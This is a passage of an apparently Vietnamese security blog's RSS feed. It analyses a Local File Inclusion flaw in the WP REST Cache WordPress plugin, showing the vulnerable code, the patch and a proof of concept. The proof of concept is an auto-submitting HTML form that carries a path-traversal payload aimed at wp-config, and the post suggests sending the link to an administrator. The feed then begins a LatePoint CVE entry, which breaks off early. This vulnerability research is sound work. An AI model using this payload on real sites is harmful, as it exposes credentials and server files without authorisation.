1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function settings_page() {&#xA;    $this-&amp;gt;settings_panels = apply_filters( &amp;#39;wp_rest_cache/settings_panels&amp;#39;, $this-&amp;gt;settings_panels );&#xA;&#xA;    $sub = filter_input( INPUT_GET, &amp;#39;sub&amp;#39;, FILTER_SANITIZE_FULL_SPECIAL_CHARS );&#xA;    if ( empty( $sub ) ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;    include_once __DIR__ . &amp;#39;/partials/header.php&amp;#39;;&#xA;    if ( isset( $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;] ) ) {&#xA;        include_once $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;];&#xA;    } elseif ( file_exists( __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39; ) ) {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    } else {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-settings.php&amp;#39;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, &lt;code&gt;$sub&lt;/code&gt; l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa &lt;a href=&#34;https://www.php.net/manual/en/function.filter-input.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;filter_input()&lt;/code&gt;&lt;/a&gt; l·∫•y gi√° tr·ªã t·ª´ tham s·ªë GET (&lt;code&gt;?sub=...&lt;/code&gt;) trong URL v·ªõi filter &lt;a href=&#34;https://www.w3schools.com/php/filter_sanitize_special_chars.asp&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;FILTER_SANITIZE_FULL_SPECIAL_CHARS&lt;/code&gt;&lt;/a&gt; d√πng ƒë·ªÉ esacape &lt;code&gt;&amp;quot;&amp;lt;&amp;gt;&amp;amp;&lt;/code&gt; v√† c√°c k√Ω t·ª± v·ªõi ASCII value d∆∞·ªõi 32. T·ª©c kh√¥ng bao g·ªìm &lt;code&gt;.(46)&lt;/code&gt; v√† &lt;code&gt;/(47)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$sub&lt;/code&gt; ƒë∆∞·ª£c concat v√†o chu·ªói c√≥ &lt;code&gt;&#39;.php&#39;&lt;/code&gt; sau c√πng tr∆∞·ªõc khi ƒë∆∞·ª£c &lt;code&gt;include_once&lt;/code&gt; m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá tr∆∞·ªõc &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function settings_page() {&#xA;    $this-&amp;gt;settings_panels = apply_filters( &amp;#39;wp_rest_cache/settings_panels&amp;#39;, $this-&amp;gt;settings_panels );&#xA;&#xA;    $sub = filter_input( INPUT_GET, &amp;#39;sub&amp;#39;, FILTER_SANITIZE_FULL_SPECIAL_CHARS );&#xA;    if ( empty( $sub ) ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;&#xA;    $potential_sub_file = __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    if ( dirname( $potential_sub_file ) !== __DIR__ . &amp;#39;/partials&amp;#39; ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;&#xA;    include_once __DIR__ . &amp;#39;/partials/header.php&amp;#39;;&#xA;    if ( isset( $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;] ) ) {&#xA;        include_once $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;];&#xA;    } elseif ( file_exists( __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39; ) ) {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    } else {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-settings.php&amp;#39;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ th√™m c∆° ch·∫ø &lt;strong&gt;ki·ªÉm tra v·ªã tr√≠ file tr∆∞·ªõc khi include&lt;/strong&gt;, ƒë·∫£m b·∫£o file ƒë∆∞·ª£c n·∫°p ch·ªâ n·∫±m trong th∆∞ m·ª•c &lt;code&gt;partials&lt;/code&gt;. N·∫øu ph√°t hi·ªán ƒë∆∞·ªùng d·∫´n ra ngo√†i (do chu·ªói nh∆∞ &lt;code&gt;../&lt;/code&gt;), plugin t·ª± ƒë·ªông chuy·ªÉn v·ªÅ file m·∫∑c ƒë·ªãnh an to√†n. Nh·ªù ƒë√≥, l·ªó h·ªïng &lt;strong&gt;LFI&lt;/strong&gt; b·ªã lo·∫°i b·ªè.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;settings_page()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback c·ªßa submenu&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_submenu_page(&#xA;    &amp;#39;options-general.php&amp;#39;,&#xA;    &amp;#39;WP REST Cache&amp;#39;,&#xA;    &amp;#39;WP REST Cache&amp;#39;,&#xA;    $capability,&#xA;    &amp;#39;wp-rest-cache&amp;#39;,&#xA;    [&#xA;        $this,&#xA;        &amp;#39;settings_page&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c khi truy c·∫≠p endpoint&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;th√¨ &lt;code&gt;settings_page()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost:80//wp-admin/options-general.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;wp-rest-cache&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;sub&amp;#34; value=&amp;#34;/../../../../../../wp-cofnig&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;G·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;C·∫£nh b√°o&lt;/p&gt;&lt;p&gt;L·ªó h·ªïng n√†y ch·ªâ khai th√°c ƒë∆∞·ª£c tr√™n &lt;strong&gt;Windows&lt;/strong&gt;, v√¨ h√†m &lt;code&gt;file_exists()&lt;/code&gt; x·ª≠ l√Ω ƒë∆∞·ªùng d·∫´n kh√°c nhau gi·ªØa hai h·ªá ƒëi·ªÅu h√†nh. Tr√™n &lt;strong&gt;Linux&lt;/strong&gt;, n·∫øu ƒë∆∞·ªùng d·∫´n ch·ª©a th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i, h√†m s·∫Ω tr·∫£ v·ªÅ &lt;code&gt;false&lt;/code&gt;. Trong khi ƒë√≥, tr√™n &lt;strong&gt;Windows&lt;/strong&gt;, c√πng ƒë∆∞·ªùng d·∫´n ƒë√≥ l·∫°i c√≥ th·ªÉ tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt;, khi·∫øn ƒëi·ªÅu ki·ªán ki·ªÉm tra b·ªã b·ªè qua v√† l·ªó h·ªïng c√≥ th·ªÉ k√≠ch ho·∫°t.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 2025.1.0&lt;/strong&gt; c·ªßa WP REST Cache cho ph√©p &lt;strong&gt;Local File Inclusion&lt;/strong&gt; qua tham s·ªë &lt;code&gt;sub&lt;/code&gt;. B·∫£n v√° &lt;strong&gt;2025.1.1&lt;/strong&gt; gi·∫£i quy·∫øt b·∫±ng c√°ch ki·ªÉm tra v·ªã tr√≠ file tr∆∞·ªõc khi include ‚Äî ƒë·∫£m b·∫£o file ch·ªâ ƒë∆∞·ª£c n·∫°p n·∫øu n·∫±m trong th∆∞ m·ª•c &lt;code&gt;partials&lt;/code&gt;, t·ª´ ƒë√≥ lo·∫°i b·ªè kh·∫£ nƒÉng path traversal/LFI.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y d·ªØ li·ªáu tr·ª±c ti·∫øp t·ª´ request v√† gh√©p v√†o ƒë∆∞·ªùng d·∫´n file l√† r·ªßi ro LFI.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c &lt;strong&gt;v·ªã tr√≠ th·ª±c t·∫ø&lt;/strong&gt; c·ªßa file (ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi) tr∆∞·ªõc khi include.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm so√°t ph·∫°m vi file b·∫±ng so s√°nh th∆∞ m·ª•c ƒë√≠ch (whitelist) hi·ªáu qu·∫£ h∆°n ch·ªâ sanitize k√Ω t·ª±.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra tr√™n nhi·ªÅu n·ªÅn t·∫£ng (Windows/Linux) v√¨ h√†nh vi h√†m file c√≥ th·ªÉ kh√°c nhau.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-rest-cache/vulnerability/wordpress-wp-rest-cache-2025-1-0-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress WP REST Cache Plugin &amp;lt;= 2025.1.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6715 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/</link>
      <pubDate>Sun, 19 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LatePoint&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 5.1.93&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6715&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6715&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.94&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; 